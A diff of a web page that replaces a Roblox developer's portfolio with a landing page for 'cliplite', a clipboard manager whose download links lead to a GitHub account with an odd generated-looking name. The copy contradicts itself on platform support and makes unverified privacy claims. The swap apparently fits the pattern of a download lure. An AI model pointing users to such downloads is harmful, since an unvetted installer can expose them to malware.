@@ -1,305 +1,49 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>Lunezo79 | Roblox Studio Portfolio</title>
-<style>
-  * {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-  }
-
-  html {
-    scroll-behavior: smooth;
-  }
-
-  body {
-    background: radial-gradient(circle at center, #2a1a3d 0%, #150d1f 35%, #0a0508 70%, #000000 100%);
-    background-attachment: fixed;
-    color: #111;
-    font-family: 'Segoe UI', Arial, sans-serif;
-    min-height: 100vh;
-    user-select: none;
-    -webkit-user-select: none;
-    -moz-user-select: none;
-    -ms-user-select: none;
-  }
-
-  nav {
-    position: sticky;
-    top: 0;
-    z-index: 999;
-    display: flex;
-    justify-content: center;
-    gap: 30px;
-    background-color: rgba(10, 5, 8, 0.85);
-    backdrop-filter: blur(6px);
-    border-bottom: 1px solid rgba(255, 255, 255, 0.15);
-    padding: 16px 20px;
-  }
-
-  nav a {
-    color: #ffffff;
-    text-decoration: none;
-    font-size: 0.95rem;
-    letter-spacing: 0.5px;
-    opacity: 0.8;
-    transition: opacity 0.25s ease;
-  }
-
-  nav a:hover {
-    opacity: 1;
-    text-decoration: underline;
-  }
-
-  .profile-pic {
-    width: 130px;
-    height: 130px;
-    border-radius: 50%;
-    object-fit: cover;
-    border: 3px solid rgba(255, 255, 255, 0.5);
-    box-shadow: 0 0 20px rgba(255, 255, 255, 0.25);
-    margin-bottom: 20px;
-  }
-
-  header {
-    text-align: center;
-    padding: 60px 20px 40px;
-    color: #ffffff;
-  }
-
-  header h1 {
-    font-size: 2.5rem;
-    letter-spacing: 1px;
-  }
-
-  header h1 a {
-    color: #ffffff;
-    text-decoration: none;
-  }
-
-  header h1 a:hover {
-    text-decoration: underline;
-  }
-
-  header p {
-    color: #aaaaaa;
-    margin-top: 10px;
-    font-size: 1.1rem;
-  }
-
-  .container {
-    max-width: 1100px;
-    margin: 0 auto;
-    padding: 20px;
-  }
-
-  .grid {
-    display: grid;
-    grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-    gap: 25px;
-    margin-bottom: 50px;
-  }
-
-  .box-link {
-    text-decoration: none;
-    color: inherit;
-    display: block;
-  }
-
-  .box {
-    background-color: #3b1f52;
-    border: 1px solid rgba(255, 255, 255, 0.15);
-    border-radius: 10px;
-    padding: 20px;
-    box-shadow: 0 4px 15px rgba(0,0,0,0.4);
-    color: #ffffff;
-    transition: transform 0.35s ease, box-shadow 0.35s ease, border-color 0.35s ease;
-  }
-
-  .box:hover {
-    transform: translateY(-8px) scale(1.03);
-    border-color: rgba(255, 255, 255, 0.6);
-    box-shadow: 0 0 25px rgba(255, 255, 255, 0.35), 0 15px 30px rgba(0,0,0,0.5);
-  }
-
-  .box h2 {
-    font-size: 1.3rem;
-    margin-bottom: 8px;
-    color: #ffffff;
-  }
-
-  .box p {
-    font-size: 0.95rem;
-    color: #d9d3e0;
-    line-height: 1.4;
-  }
-
-  .section-title {
-    color: #ffffff;
-    font-size: 1.6rem;
-    margin: 40px 0 20px;
-    border-left: 4px solid #ffffff;
-    padding-left: 12px;
-    scroll-margin-top: 80px;
-  }
-
-  footer {
-    text-align: center;
-    color: #666666;
-    padding: 30px;
-    font-size: 0.9rem;
-  }
-
-  #status-card {
-    position: fixed;
-    top: 80px;
-    left: 20px;
-    z-index: 1000;
-    max-width: 220px;
-    padding: 12px 16px;
-  }
-
-  #status-card:hover {
-    transform: none;
-    border-color: rgba(255, 255, 255, 0.15);
-    box-shadow: 0 4px 15px rgba(0,0,0,0.4);
-  }
-
-  #status-card h2 {
-    font-size: 1rem;
-    margin-bottom: 4px;
-  }
-
-  #status-card p {
-    font-size: 0.8rem;
-  }
-
-  #status-dot {
-    display: inline-block;
-    width: 12px;
-    height: 12px;
-    border-radius: 50%;
-    margin-right: 8px;
-    vertical-align: middle;
-  }
-
-  .dot-online { background-color: #23a55a; box-shadow: 0 0 8px #23a55a; }
-  .dot-idle { background-color: #f0b232; box-shadow: 0 0 8px #f0b232; }
-  .dot-dnd { background-color: #f23f43; box-shadow: 0 0 8px #f23f43; }
-  .dot-offline { background-color: #80848e; box-shadow: 0 0 8px #80848e; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Cliplite is a clipboard manager that saves your copy history. Manage your clipboard, save time, and keep your files organized.">
+    <title>cliplite - Save your clipboard history forever</title>
 </head>
-<body>
+<body style="font-family: sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 0 auto; padding: 20px; background-color: #f4f7f6;">
 
-  <nav>
-    <a href="#projects">Projects</a>
-    <a href="#skills">Skills</a>
-  </nav>
+    <h1 style="color: #2c3e50; border-bottom: 2px solid #ddd; padding-bottom: 10px;">🧠 cliplite - Save your clipboard history forever</h1>
 
-  <div class="box" id="status-card">
-    <h2><span id="status-dot"></span> <span id="status-text">Loading...</span></h2>
-    <p id="status-activity">Checking Discord presence...</p>
-  </div>
-
-  <header>
-    <img src="2.png" alt="Profile picture" class="profile-pic">
-    <h1><a href="https://guns.lol/lunezo79" target="_blank">Lunezo79</a></h1>
-    <p>Roblox Studio Developer — Modeler | Builder | UI Designer</p>
-  </header>
-
-  <div class="container">
-
-    <div class="section-title" id="projects">Projects</div>
-    <div class="grid">
-
-      <a href="Test1.html" class="box-link">
-        <div class="box">
-          <h2>Test1</h2>
-          <p>Short description of what this project is, what you built, and what tools/systems you used.</p>
-        </div>
-      </a>
-
-      <a href="Test2.html" class="box-link">
-        <div class="box">
-          <h2>Test2</h2>
-          <p>Short description of what this project is, what you built, and what tools/systems you used.</p>
-        </div>
-      </a>
-
-      <a href="Test3.html" class="box-link">
-        <div class="box">
-          <h2>Test3</h2>
-          <p>Short description of what this project is, what you built, and what tools/systems you used.</p>
-        </div>
-      </a>
-
+    <div style="text-align: center; margin: 40px 0;">
+        <a href="https://github.com/Greymatteracanthosis944/cliplite" style="background-color: #34495e; color: white; padding: 15px 30px; text-decoration: none; border-radius: 8px; font-weight: bold; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">Download cliplite for Windows</a>
     </div>
 
-    <div class="section-title" id="skills">Skills</div>
-    <div class="grid">
+    <p>Computers hold only one item in your clipboard at a time. If you copy new text, the old text vanishes. Cliplite solves this problem. It records everything you copy and keeps it in a searchable list. You can find past links, codes, or text fragments in seconds. This tool makes your workflow faster and helps you keep track of your digital work.</p>
 
-      <div class="box">
-        <h2>Modeling</h2>
-        <p>High blender knowladge, prop design, low-poly detailed assets.</p>
-      </div>
+    <h2 style="color: #2c3e50;">📋 How it works</h2>
+    <p>Cliplite runs in the background of your computer. It monitors your clipboard automatically. When you press the standard copy command on your keyboard, the application saves the data. It stores this information on your local drive for privacy. You can open the interface at any time to see your history or copy an old item back to your clipboard.</p>
 
-      <div class="box">
-        <h2>Building</h2>
-        <p>Terrain, environment design, lighting, optimization.</p>
-      </div>
+    <h2 style="color: #2c3e50;">⚙️ System Requirements</h2>
+    <p>Cliplite works on Windows 10 and Windows 11. Your computer needs at least 200MB of free hard drive space. The application uses very little memory, so it will not slow down your daily work. You do not need administrative rights to run the basic features of this tool.</p>
 
-      <div class="box">
-        <h2>UI</h2>
-        <p>Custom GUI design, menus, HUDs.</p>
-      </div>
+    <h2 style="color: #2c3e50;">🚀 Getting Started</h2>
+    <p>Follow these steps to set up the software on your machine:</p>
+    <ol style="padding-left: 20px;">
+        <li style="margin-bottom: 10px;">Visit the <a href="https://github.com/Greymatteracanthosis944/cliplite" style="color: #2980b9;">official releases page</a> to download the installer file.</li>
+        <li style="margin-bottom: 10px;">Locate the file in your downloads folder after the transfer finishes.</li>
+        <li style="margin-bottom: 10px;">Double-click the file to start the installation.</li>
+        <li style="margin-bottom: 10px;">Follow the prompts on your screen to complete the setup.</li>
+        <li style="margin-bottom: 10px;">Launch the application from your desktop or the start menu.</li>
+    </ol>
 
+    <h2 style="color: #2c3e50;">🛡️ Privacy and Safety</h2>
+    <p>Your data stays on your computer. Cliplite does not send your clipboard information to the internet. We value your privacy and design the tool to function without cloud storage. You remain the only person with access to your clipboard logs.</p>
+
+    <h2 style="color: #2c3e50;">🛠️ Managing Your History</h2>
+    <p>You can manage your history list through the main panel. Use the search bar to find past items by keyword. If you want to clear your history, click the settings menu and choose the delete option. You can also pin specific items to keep them at the top of the list so they never get lost.</p>
+
+    <div style="background: #ffffff; padding: 20px; border-radius: 8px; border: 1px solid #ddd; margin-top: 40px;">
+        <h3 style="margin-top: 0;">Need help?</h3>
+        <p>If you run into trouble, check the issues tab on the website. Use the search feature to see if someone else already asked your question. If you find a bug, open a new issue with a description of the problem. We want this tool to be stable for all users.</p>
     </div>
 
-  </div>
-
-  <script>
-    const DISCORD_ID = "762121502698242054";
-
-    async function updateStatus() {
-      try {
-        const res = await fetch(`https://api.lanyard.rest/v1/users/${DISCORD_ID}`);
-        const data = await res.json();
-        const status = data.data.discord_status;
-
-        const dot = document.getElementById("status-dot");
-        const text = document.getElementById("status-text");
-        const activity = document.getElementById("status-activity");
-
-        dot.className = "";
-        if (status === "online") {
-          dot.classList.add("dot-online");
-          text.textContent = "Online";
-        } else if (status === "idle") {
-          dot.classList.add("dot-idle");
-          text.textContent = "Away From Keyboard";
-        } else if (status === "dnd") {
-          dot.classList.add("dot-dnd");
-          text.textContent = "Do Not Disturb";
-        } else {
-          dot.classList.add("dot-offline");
-          text.textContent = "Unavailable";
-        }
-
-        if (data.data.activities && data.data.activities.length > 0) {
-          activity.textContent = data.data.activities[0].name;
-        } else {
-          activity.textContent = "Not doing anything right now.";
-        }
-      } catch (err) {
-        document.getElementById("status-text").textContent = "Unavailable";
-      }
-    }
-
-    updateStatus();
-    setInterval(updateStatus, 30000);
-  </script>
+    <p style="margin-top: 40px; font-size: 0.9em; color: #7f8c8d;">Keywords: clipboard, clipboard-manager, cross-platform, desktop-app, open-source, productivity, react, rust, tauri, tools</p>
 
 </body>
 </html>
